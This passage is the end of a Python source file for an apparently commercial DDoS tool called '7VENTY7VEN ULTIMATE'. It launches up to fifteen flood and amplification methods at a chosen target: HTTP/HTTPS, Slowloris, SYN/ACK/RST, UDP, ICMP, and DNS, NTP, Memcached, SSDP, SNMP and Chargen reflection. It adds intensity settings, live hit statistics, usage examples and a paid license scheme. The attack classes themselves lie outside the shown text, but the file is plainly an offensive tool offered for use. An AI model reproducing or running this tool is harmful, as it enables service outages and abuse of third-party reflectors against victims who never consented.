                methods = ['SLOWLORIS', 'HTTP', 'HTTPS', 'UDP', 'WEBSOCKET']
            else:
                methods = ['SLOWLORIS', 'HTTP']  # Trial
        
        self.running = True
        
        # Start selected attacks
        for method in methods:
            threads = base_threads
            
            # Adjust threads per method
            if method in ['TCP_SYN', 'TCP_ACK', 'RST']:
                threads = max(5, threads // 4)
            
            # Check root requirement
            if method in self.root_required and not self.license.is_root:
                print(f"{Colors.YELLOW}⚠️  {method} requires root - skipping{Colors.END}")
                continue
            
            try:
                if method == 'HTTP':
                    a = HTTPAttack(self.tracker)
                    a.start(target, threads)
                    self.attacks['HTTP'] = a
                    print(f"{Colors.GREEN}✅ HTTP started ({threads} threads){Colors.END}")
                
                elif method == 'HTTPS':
                    a = HTTPSAttack(self.tracker)
                    a.start(target, threads)
                    self.attacks['HTTPS'] = a
                    print(f"{Colors.GREEN}✅ HTTPS started ({threads} threads){Colors.END}")
                
                elif method == 'UDP':
                    a = UDPAttack(self.tracker)
                    a.start(target_ip, parsed.port or 80, threads)
                    self.attacks['UDP'] = a
                    print(f"{Colors.GREEN}✅ UDP started ({threads} threads){Colors.END}")
                
                elif method == 'TCP_SYN':
                    a = SYNAttack(self.tracker)
                    a.start(target_ip, parsed.port or 80, threads)
                    self.attacks['TCP_SYN'] = a
                    print(f"{Colors.GREEN}✅ TCP_SYN started ({threads} threads){Colors.END}")
                
                elif method == 'TCP_ACK':
                    a = ACKAttack(self.tracker)
                    a.start(target_ip, parsed.port or 80, threads)
                    self.attacks['TCP_ACK'] = a
                    print(f"{Colors.GREEN}✅ TCP_ACK started ({threads} threads){Colors.END}")
                
                elif method == 'DNS':
                    a = DNSAttack(self.tracker)
                    a.start(target_ip, threads)
                    self.attacks['DNS'] = a
                    print(f"{Colors.GREEN}✅ DNS started ({threads} threads){Colors.END}")
                
                elif method == 'NTP':
                    a = NTPAttack(self.tracker)
                    a.start(target_ip, threads)
                    self.attacks['NTP'] = a
                    print(f"{Colors.GREEN}✅ NTP started ({threads} threads){Colors.END}")
                
                elif method == 'SLOWLORIS':
                    a = SlowlorisAttack(self.tracker)
                    a.start(target, max(10, threads // 4))
                    self.attacks['SLOWLORIS'] = a
                    print(f"{Colors.GREEN}✅ SLOWLORIS started ({max(10, threads // 4)} threads){Colors.END}")
                
                elif method == 'ICMP':
                    a = ICMPAttack(self.tracker)
                    a.start(target_ip, threads)
                    self.attacks['ICMP'] = a
                    print(f"{Colors.GREEN}✅ ICMP started ({threads} threads){Colors.END}")
                
                elif method == 'MEMCACHED':
                    a = MemcachedAttack(self.tracker)
                    a.start(target_ip, threads)
                    self.attacks['MEMCACHED'] = a
                    print(f"{Colors.GREEN}✅ MEMCACHED started ({threads} threads){Colors.END}")
                
                elif method == 'SSDP':
                    a = SSDPAttack(self.tracker)
                    a.start(target_ip, threads)
                    self.attacks['SSDP'] = a
                    print(f"{Colors.GREEN}✅ SSDP started ({threads} threads){Colors.END}")
                
                elif method == 'SNMP':
                    a = SNMPAttack(self.tracker)
                    a.start(target_ip, threads)
                    self.attacks['SNMP'] = a
                    print(f"{Colors.GREEN}✅ SNMP started ({threads} threads){Colors.END}")
                
                elif method == 'WEBSOCKET':
                    a = WebSocketAttack(self.tracker)
                    a.start(target, threads)
                    self.attacks['WEBSOCKET'] = a
                    print(f"{Colors.GREEN}✅ WEBSOCKET started ({threads} threads){Colors.END}")
                
                elif method == 'RST':
                    a = RSTAttack(self.tracker)
                    a.start(target_ip, parsed.port or 80, threads)
                    self.attacks['RST'] = a
                    print(f"{Colors.GREEN}✅ RST started ({threads} threads){Colors.END}")
                
                elif method == 'CHARGEN':
                    a = ChargenAttack(self.tracker)
                    a.start(target_ip, threads)
                    self.attacks['CHARGEN'] = a
                    print(f"{Colors.GREEN}✅ CHARGEN started ({threads} threads){Colors.END}")
                    
            except Exception as e:
                print(f"{Colors.RED}❌ Failed to start {method}: {e}{Colors.END}")
        
        print(f"\n{Colors.CYAN}⚡ Attack running! Press Ctrl+C to stop{Colors.END}\n")
        
        # Status display
        self.display()
    
    def display(self):
        """Display status"""
        try:
            while self.running:
                stats = self.tracker.get_stats()
                
                # Clear screen
                os.system('clear' if os.name == 'posix' else 'cls')
                
                # Get Slowloris count
                slowloris_count = 0
                if 'SLOWLORIS' in self.attacks:
                    slowloris_count = self.attacks['SLOWLORIS'].get_count()
                
                # Header
                print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════════╗
║                    📊 LIVE ATTACK STATUS - 15 METHODS            ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  🎯 TOTAL HITS: {stats['total']:<8}  ⚡ RATE: {stats['rate']:.1f}/s                     ║
║  🐌 SLOWLORIS: {slowloris_count:<4} connections                              ║
║  ⏱️  ELAPSED: {int(stats['elapsed']//60)}m {int(stats['elapsed']%60)}s                                   ║
║                                                                   ║
╠═══════════════════════════════════════════════════════════════════╣
║                    📋 HIT BREAKDOWN                               ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║""")
                
                # Show all 15 methods
                all_methods = ['HTTP', 'HTTPS', 'UDP', 'TCP_SYN', 'TCP_ACK', 'DNS', 'NTP', 
                              'SLOWLORIS', 'ICMP', 'MEMCACHED', 'SSDP', 'SNMP', 
                              'WEBSOCKET', 'RST', 'CHARGEN']
                
                for method in all_methods:
                    count = stats['by_method'].get(method, 0)
                    if count > 0 or method in self.attacks:
                        bar = '█' * min(20, int(count / max(1, stats['total']) * 20)) if stats['total'] > 0 else ''
                        print(f"║  {method:<10}: {count:>6} hits [{bar:<20}]          ║")
                
                print(f"""
╠═══════════════════════════════════════════════════════════════════╣
║                    📋 LAST 8 HITS                                 ║
╠═══════════════════════════════════════════════════════════════════╣""")
                
                for hit in stats['last']:
                    print(f"║  [{hit['time']}] {hit['method']:<8} → {hit['target']}:{hit['port']:<5}     ║")
                
                print(f"""
╠═══════════════════════════════════════════════════════════════════╣
║                    🔑 LICENSE INFO                                ║
╠═══════════════════════════════════════════════════════════════════╣
║  Type: {self.license.type.value.upper():<15}                                   ║
║  Expires: {self.license.expiry.strftime('%Y-%m-%d') if self.license.expiry else 'Never'}              ║
║  Root: {'YES' if self.license.is_root else 'NO'} - {'All methods' if self.license.is_root else '10 methods require root'}   ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
                """)
                
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Stop all attacks"""
        print(f"\n{Colors.YELLOW}🛑 Stopping all attacks...{Colors.END}")
        self.running = False
        
        for name, attack in self.attacks.items():
            attack.stop()
        
        # Final stats
        stats = self.tracker.get_stats()
        
        print(f"""
{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════╗
║                    🏁 FINAL STATISTICS - ALL 15 METHODS         ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  🎯 TOTAL HITS: {stats['total']:<8}                                      ║
║  ⚡ AVG RATE: {stats['total']/max(1, stats['elapsed']):.1f}/s                       ║
║  ⏱️  DURATION: {int(stats['elapsed']//60)}m {int(stats['elapsed']%60)}s                                  ║
║                                                                   ║
╠═══════════════════════════════════════════════════════════════════╣
║                    📊 FINAL BREAKDOWN                             ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║""")
        
        for method, count in sorted(stats['by_method'].items(), key=lambda x: x[1], reverse=True):
            percentage = (count / stats['total'] * 100) if stats['total'] > 0 else 0
            bar = '█' * int(percentage / 5)
            print(f"║  {method:<10}: {count:>6} hits ({percentage:>5.1f}%) [{bar:<20}]║")
        
        print(f"""
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        # Save report
        self.save_report(stats)
    
    def save_report(self, stats):
        """Save report"""
        report = {
            'timestamp': datetime.datetime.now().isoformat(),
            'license': self.license.type.value,
            'hardware_id': self.license.hardware_id,
            'stats': {
                'total_hits': stats['total'],
                'duration': stats['elapsed'],
                'average_rate': stats['total'] / max(1, stats['elapsed']),
                'by_method': stats['by_method']
            },
            'methods_used': list(self.attacks.keys())
        }
        
        filename = f"report_{int(time.time())}.json"
        try:
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"{Colors.GREEN}📁 Report saved to {filename}{Colors.END}")
        except:
            pass

# ==================== MAIN ====================

def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description='7VENTY7VEN ULTIMATE - ALL 15 METHODS')
    parser.add_argument('-t', '--target', help='Target URL/IP')
    parser.add_argument('-m', '--methods', nargs='+', 
                       choices=['HTTP', 'HTTPS', 'UDP', 'TCP_SYN', 'TCP_ACK', 'DNS', 'NTP',
                               'SLOWLORIS', 'ICMP', 'MEMCACHED', 'SSDP', 'SNMP',
                               'WEBSOCKET', 'RST', 'CHARGEN', 'ALL'],
                       help='Attack methods (use ALL for everything)')
    parser.add_argument('-i', '--intensity', default='medium',
                       choices=['low', 'medium', 'high', 'extreme', 'insane', 'ultimate'],
                       help='Attack intensity')
    parser.add_argument('--list', action='store_true', help='List all methods')
    parser.add_argument('--license', action='store_true', help='Show license')
    parser.add_argument('--activate', action='store_true', help='Activate license')
    parser.add_argument('--generate-key', help='Generate license key (admin)')
    
    args = parser.parse_args()
    
    if args.list:
        print(f"""
{Colors.CYAN}Available Attack Methods (15 total):{Colors.END}

{Colors.GREEN}Layer 7 (Application):{Colors.END}
  🌐 HTTP         - Standard HTTP flood
  🔒 HTTPS        - Encrypted HTTPS flood
  🐌 SLOWLORIS    - Slow HTTP headers attack
  🔌 WEBSOCKET    - WebSocket connections flood

{Colors.YELLOW}Layer 4 (Transport):{Colors.END}
  💧 UDP          - Raw UDP flood
  📡 TCP_SYN      - SYN flood (requires root)
  📨 TCP_ACK      - ACK flood (requires root)
  💥 RST          - TCP RST flood (requires root)

{Colors.RED}Amplification (Reflection):{Colors.END}
  🌍 DNS          - DNS amplification (requires root)
  ⏰ NTP          - NTP monlist amplification (requires root)
  💾 MEMCACHED    - Memcached amplification (requires root)
  📺 SSDP         - SSDP reflection (requires root)
  🔧 SNMP         - SNMP reflection (requires root)
  ⚡ CHARGEN      - Chargen amplification (requires root)

{Colors.BLUE}Other:{Colors.END}
  📶 ICMP         - Ping flood (requires root)

{Colors.MAGENTA}Usage Examples:{Colors.END}
  python3 ultimate.py -t http://example.com -m ALL -i ultimate
  python3 ultimate.py -t http://example.com -m SLOWLORIS HTTP HTTPS -i high
  python3 ultimate.py -t 192.168.1.1 -m UDP TCP_SYN -i extreme --root
        """)
        return
    
    if args.license:
        lm = LicenseManager()
        print(f"""
License Information:
  Type: {lm.type.value if hasattr(lm, 'type') else 'None'}
  Valid: {lm.is_valid if hasattr(lm, 'is_valid') else False}
  Hardware ID: {lm.hardware_id}
  Expires: {lm.expiry.strftime('%Y-%m-%d') if hasattr(lm, 'expiry') and lm.expiry else 'N/A'}
  Root Access: {'YES' if lm.is_root else 'NO'}
        """)
        return
    
    if args.activate:
        LicenseManager()
        return
    
    if args.generate_key:
        lm = LicenseManager()
        key = lm.generate_license(LicenseType.ENTERPRISE, 365)
        print(f"Generated License Key:\n{key}")
        return
    
    if not args.target:
        parser.print_help()
        return
    
    # Convert ALL to all methods
    if args.methods and 'ALL' in args.methods:
        args.methods = ['HTTP', 'HTTPS', 'UDP', 'TCP_SYN', 'TCP_ACK', 'DNS', 'NTP',
                       'SLOWLORIS', 'ICMP', 'MEMCACHED', 'SSDP', 'SNMP',
                       'WEBSOCKET', 'RST', 'CHARGEN']
    
    # Start hammer
    hammer = UltimateHammer()
    
    try:
        hammer.start(args.target, args.methods, args.intensity)
        while hammer.running:
            time.sleep(1)
    except KeyboardInterrupt:
        hammer.stop()

if __name__ == "__main__":
    main()